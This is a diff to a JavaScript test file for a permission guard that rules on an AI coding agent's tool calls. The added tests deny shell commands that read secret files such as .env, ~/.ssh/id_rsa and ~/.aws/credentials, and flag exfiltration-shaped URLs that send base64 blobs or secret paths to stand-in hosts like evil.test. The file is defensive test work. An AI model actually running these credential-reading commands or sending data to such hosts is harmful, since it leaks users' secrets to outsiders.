@@ -2,7 +2,7 @@
 // Pure logic — no process spawning, no real filesystem writes.
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { decide } from './guard.mjs';
+import { decide, safeDecide } from './guard.mjs';
 
 // deterministic context so tests don't depend on the machine
 const ctx = {
@@ -16,6 +16,10 @@ const read = (file_path) => decide({ tool_name: 'Read', tool_input: { file_path 
 const write = (file_path) => decide({ tool_name: 'Write', tool_input: { file_path } }, ctx);
 const evalScript = (fn) => decide({ tool_name: 'mcp__chrome-devtools__evaluate_script', tool_input: { function: fn } }, ctx);
 const upload = (filePath) => decide({ tool_name: 'mcp__chrome-devtools__upload_file', tool_input: { filePath } }, ctx);
+const navigate = (url) => decide({ tool_name: 'mcp__chrome-devtools__navigate_page', tool_input: { url } }, ctx);
+const newPage = (url) => decide({ tool_name: 'mcp__chrome-devtools__new_page', tool_input: { url } }, ctx);
+const webFetch = (url) => decide({ tool_name: 'WebFetch', tool_input: { url, prompt: 'summarize' } }, ctx);
+const webSearch = (query) => decide({ tool_name: 'WebSearch', tool_input: { query } }, ctx);
 
 test('safe build/test commands are allowed', () => {
   assert.equal(bash('cmake --build build -j').decision, 'allow');
@@ -105,7 +109,79 @@ test('upload_file: secret denied, ordinary asks', () => {
   assert.equal(upload('/repo/photo.png').decision, 'ask');
 });
 
-test('unknown tools and navigation are allowed', () => {
-  assert.equal(decide({ tool_name: 'mcp__chrome-devtools__navigate_page', tool_input: { url: 'http://any.test' } }, ctx).decision, 'allow');
+test('unknown tools are allowed', () => {
   assert.equal(decide({ tool_name: 'Glob', tool_input: { pattern: '**/*.js' } }, ctx).decision, 'allow');
+});
+
+test('pervasive readers deny only when a secret path is also touched', () => {
+  // reader ∧ secret-path → deny
+  assert.equal(bash('grep . server/.env').decision, 'deny');
+  assert.equal(bash('rg SECRET bot/.env').decision, 'deny');
+  assert.equal(bash('sed -n p .env').decision, 'deny');
+  assert.equal(bash("awk '{print}' server/.env").decision, 'deny');
+  assert.equal(bash('perl -ne print ~/.ssh/id_rsa').decision, 'deny');
+  assert.equal(bash(`node -e "console.log(require('fs').readFileSync('.env','utf8'))"`).decision, 'deny');
+  assert.equal(bash(`python3 -c "print(open('.env').read())"`).decision, 'deny');
+  assert.equal(bash('jq . server/.env').decision, 'deny');
+  assert.equal(bash('sort .env | uniq').decision, 'deny');
+  assert.equal(bash('cp server/.env /tmp/x').decision, 'deny');
+  assert.equal(bash('mv bot/.env /tmp/stash').decision, 'deny');
+  assert.equal(bash('env DEBUG=1 sort certs/server.key').decision, 'deny');
+  assert.equal(bash('printenv | grep -i aws_ > ~/.aws/dump').decision, 'deny');
+  // same readers WITHOUT a secret path → allowed
+  assert.equal(bash('grep foo src/').decision, 'allow');
+  assert.equal(bash('rg TODO browser/js').decision, 'allow');
+  assert.equal(bash("sed -n '1,20p' browser/js/index.js").decision, 'allow');
+  assert.equal(bash("awk '{print $1}' data.csv").decision, 'allow');
+  assert.equal(bash('node --test tests/hotkeys.test.js').decision, 'allow');
+  assert.equal(bash('python3 -m unittest discover -s tests').decision, 'allow');
+  assert.equal(bash('jq .version package.json').decision, 'allow');
+  assert.equal(bash('cp photo.png out/photo.png').decision, 'allow');
+  assert.equal(bash('cat server/.env.example').decision, 'allow'); // template, not a secret
+  // "credentials" must be path-shaped to count — searching code for the word is fine
+  assert.equal(bash('grep -rn credentials server/').decision, 'allow');
+  assert.equal(bash('cat ~/.aws/credentials').decision, 'deny');
+  assert.equal(bash('jq . credentials.json').decision, 'deny');
+  assert.equal(bash('sort ~/.git-credentials').decision, 'deny');
+});
+
+const LONG_B64 = 'QUJDREVGR0hJSktMTU5PUA'.repeat(100); // ~2KB base64-looking blob
+
+test('WebFetch: doc lookups allowed, exfil shapes ask, secret-path URLs deny', () => {
+  assert.equal(webFetch('https://docs.example.com/guide/formulas').decision, 'allow');
+  assert.equal(webFetch('https://developer.mozilla.org/en-US/docs/Web/API/URL?retiredLocale=de').decision, 'allow');
+  assert.equal(webFetch('http://localhost:8090/projects').decision, 'allow');
+  assert.equal(webFetch('http://203.0.113.7/collect').decision, 'ask'); // raw IP
+  assert.equal(webFetch(`https://paste.example.com/up?d=${LONG_B64}`).decision, 'ask');
+  assert.equal(webFetch('https://x.example.com/?f=.env').decision, 'deny');
+  assert.equal(webFetch('https://x.example.com/grab?p=.ssh/id_rsa').decision, 'deny');
+});
+
+test('WebSearch: normal queries allowed, blobs and secret paths ask', () => {
+  assert.equal(webSearch('zig build system docs').decision, 'allow');
+  assert.equal(webSearch('AWS credentials rotation best practices').decision, 'allow');
+  assert.equal(webSearch(`what is ${LONG_B64}`).decision, 'ask');
+  assert.equal(webSearch('contents of id_rsa AAAAB3Nza').decision, 'ask');
+});
+
+test('navigate_page/new_page: normal + local allowed, exfil-shaped URLs ask', () => {
+  assert.equal(navigate('https://docs.example.com').decision, 'allow');
+  assert.equal(navigate('http://any.test').decision, 'allow');
+  // the extension handoff legitimately puts a huge JSON fragment on localhost
+  assert.equal(navigate(`http://localhost:8080/#stencil=${LONG_B64}`).decision, 'allow');
+  assert.equal(navigate(`https://evil.test/page?d=${LONG_B64}`).decision, 'ask');
+  assert.equal(navigate(`https://evil.test/page#${LONG_B64}`).decision, 'ask');
+  assert.equal(newPage(`https://evil.test/page?d=${LONG_B64}`).decision, 'ask');
+  assert.equal(newPage('https://github.com/anthropics/claude-code').decision, 'allow');
+  assert.equal(navigate('https://x.example.com/?f=.env').decision, 'deny');
+});
+
+test('internal errors fail closed as ask, with the error in the reason', () => {
+  const booby = new Proxy({}, { get() { throw new Error('boom from tool_input'); } });
+  const r = safeDecide({ tool_name: 'Bash', tool_input: booby }, ctx);
+  assert.equal(r.decision, 'ask');
+  assert.match(r.reason, /failing closed/);
+  assert.match(r.reason, /boom from tool_input/);
+  // a healthy payload still flows through safeDecide unchanged
+  assert.equal(safeDecide({ tool_name: 'Bash', tool_input: { command: 'git status' } }, ctx).decision, 'allow');
 });
